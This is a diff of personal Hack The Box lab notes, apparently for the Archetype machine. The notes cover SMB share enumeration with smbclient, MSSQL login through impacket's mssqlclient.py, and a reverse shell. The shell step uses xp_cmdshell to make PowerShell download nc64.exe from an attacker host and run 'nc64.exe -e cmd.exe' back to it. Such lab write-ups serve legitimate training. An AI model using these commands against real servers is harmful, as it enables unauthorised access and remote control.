@@ -93,18 +93,20 @@ ip a | grep tun0 -- saber la ip de la vpn del kali linux
 
 *********************************
 
-SMB cliente attack
+
+cliente attack
 
 port 135 RPC
 port 139 Netbios
-port 445 SMB
+port 445 
+
 
 #sudo apt install smbclient
 #smbclient
 #smbclient -L target_ip -U Administrator -- in order to list the various available shares ( -L ) and to attempt a login as the Administrator accounT
 └──╼ [★]$ smbclient -L 10.129.123.161 -U Administrator
 
-
+ smbclient -N -L \\\\{TARGET_IP}\\
  smbclient \\\\10.129.123.161\\ADMIN$ -U Administrator  -- DAR ENTER
   smbclient \\\\10.129.123.161\\C$ -U Administrator
   cd Users/Administrator/Desktop
@@ -118,9 +120,66 @@ port 445 SMB
  
 *****************************
 
+SMBclient
 
+smbclient -N -L \\\10.129.124.2\\
+ Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        backups         Disk
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+
+-N : No password
+-L : This option allows you to look at what services are available on a server
+
+smbclient -N  \\\\10.129.124.2\\ADMIN$   --salio access denied
+smbclient -N \\\\10.129.124.2\\C$  -- salio access denied
+ smbclient -N \\\\10.129.124.2\\backups
  
-
-
-********************
+ **********************
+ IMPACKET
  
+ Impacket tool includes a valueable python script called
+mssqlclient.py which offers such a functionality.
+
+##Descarga del git de impacket
+https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py
+
+git clone https://github.com/SecureAuthCorp/impacket.git
+sudo apt install python3 python3-pip
+cd impacket
+pip3 install .
+
+
+#python3 /home/htb-marietto76/impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.129.124.2 -windows-auth
+
+
+what is the role we have in the server
+SELECT is_srvrolemember('sysadmin');
+
+
+************************
+
+xp_cmdshell
+shell dentro de MSSQL
+
+
+
+******************************
+REVERSE SHELL to MSSQL windows server
+https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+ 
+sudo python3 -m http.server 80
+sudo nc -lvnp 443
+
+SQL>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.114:81/nc64.exe -outfile nc64.exe
+
+SQL>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.114 443"
+
+*
+C:\Users\sql_svc\Desktop>type user.txt
+
+
+***********************************
+
